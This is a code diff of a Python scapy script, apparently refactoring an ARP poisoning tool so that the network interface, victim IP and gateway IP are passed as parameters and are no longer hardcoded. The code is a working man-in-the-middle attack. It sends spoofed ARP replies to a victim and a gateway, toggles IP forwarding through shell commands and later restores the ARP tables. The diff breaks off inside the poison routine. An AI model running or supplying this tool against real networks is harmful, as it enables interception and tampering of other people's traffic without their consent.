@@ -3,13 +3,12 @@ import sys
 import time
 from scapy.all import *
 
-interface = "eth0"
-victimIP = "192.168.0.13"
-gateIP = "192.168.0.2"
-
 class Arp_poison:
-        def __init__(self):
+        def __init__(self, interface, victimIP, gateIP):
                 self.run_poison = True
+                self.interface = interface
+                self.victimIP = victimIP
+                self.gateIP = gateIP
 
         def enablePoison(self):
                 print("\n[*] Enabling IP Forwarding...\n")
@@ -23,34 +22,34 @@ class Arp_poison:
 
         def get_mac(self, IP):
                 conf.verb = 0
-                ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+                ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.interface, inter = 0.1)
                 for snd,rcv in ans:
                         return rcv.sprintf(r"%Ether.src%")
  
         def reARP(self):
                 print("\n[*] Restoring Targets...")
-                victimMAC = self.get_mac(victimIP)
-                gateMAC = self.get_mac(gateIP)
-                send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-                send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+                victimMAC = self.get_mac(self.victimIP)
+                gateMAC = self.get_mac(self.gateIP)
+                send(ARP(op = 2, pdst = self.gateIP, psrc = self.victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+                send(ARP(op = 2, pdst = self.victimIP, psrc = self.gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
                 print("[*] Disabling IP Forwarding...")
                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                 print("[*] Poison Stopped.")
  
         def trick(self, gm, vm):
-                send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-                send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+                send(ARP(op = 2, pdst = self.victimIP, psrc = self.gateIP, hwdst= vm))
+                send(ARP(op = 2, pdst = self.gateIP, psrc = self.victimIP, hwdst= gm))
 
         def poison(self):
                 try:
-                        victimMAC = self.get_mac(victimIP)
+                        victimMAC = self.get_mac(self.victimIP)
                 except Exception:
                         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                         print("[!] Couldn't Find Victim MAC Address")
                         print("[!] Exiting...")
                         sys.exit(1)
                 try:
-                        gateMAC = self.get_mac(gateIP)
+                        gateMAC = self.get_mac(self.gateIP)
                 except Exception:
                         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                         print("[!] Couldn't Find Gateway MAC Address")
